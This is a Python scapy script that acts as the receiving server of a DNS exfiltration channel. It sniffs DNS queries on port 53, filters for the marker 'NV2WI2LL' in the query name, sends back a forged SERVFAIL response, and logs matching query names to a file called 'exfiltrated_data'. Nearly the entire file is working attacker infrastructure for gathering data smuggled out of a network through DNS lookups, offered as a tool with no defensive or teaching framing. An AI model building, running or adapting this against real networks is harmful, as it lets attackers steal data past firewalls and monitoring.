from scapy.all import *

def parser_dns_server_IP(pkt):
    global client_ip
    global client_ip_sport
    global client_ip_dns_id
    global client_ip_dns_qname
    global client_ip_dns_qtype
    global client_ip_dns_qclass
    if pkt[IP].dst !=0:
        try:
            client_ip=pkt[IP].src
            client_ip_sport=pkt[UDP].sport
            client_ip_dns_id=pkt[DNS].id
            client_ip_dns_qname=pkt[DNSQR].qname
            client_ip_dns_qtype=pkt[DNSQR].qtype
            client_ip_dns_qclass=pkt[DNSQR].qclass
        except:
            print("Parser Error")

def reply_dns_fail_response (client_ip_addr,client_dport,client_dns_id,dns_qname,dns_query_type):
    reply_dns_fail_response = IP(id=RandShort(),dst=client_ip_addr)/UDP(sport=53, dport=client_dport)/DNS(id=client_dns_id,qr=1,rd=1,rcode=2,arcount=1,qd=DNSQR(qname=dns_qname,qtype=dns_query_type,qclass="IN")) / DNSRROPT(type="OPT",rclass=4000,version=0)
    send(reply_dns_fail_response,verbose=False)


def dns_server_side():
    new_query_type = None
    i=1
    sniff(prn=parser_dns_server_IP,filter="port 53 and udp",store=0,count=i)
    print("Source IP",client_ip)
    print("Source Port",client_ip_sport)
    print("DNS TxID",client_ip_dns_id)
    dns_query_name = client_ip_dns_qname.decode("utf-8")
    print("DNS Query",dns_query_name)
    query_type = client_ip_dns_qtype
    print("qclass",client_ip_dns_qclass)
    if query_type == 1:
        new_query_type = "A"
    elif query_type == 5:
        new_query_type = "CNAME"
    elif query_type == 16:
        new_query_type = "TXT"
    elif query_type == 28:
        new_query_type = "AAAA"
    print("Qtype=",new_query_type)
    try:
        if dns_query_name is not None and new_query_type is not None and client_ip_dns_qclass == 1 and "NV2WI2LL" in dns_query_name.upper():
            reply_dns_fail_response(client_ip,client_ip_sport,client_ip_dns_id,dns_query_name,new_query_type)
            try:
                result = dns_query_name[:1].isdigit()
                if result == True:
                    with open("exfiltrated_data", "a") as fh:
                        fh.write(dns_query_name.lower()+'\n')
            except:
                None
        else:
            print("Unexcepted Error")
    except:
        None
#####################
while True :
    dns_server_side()
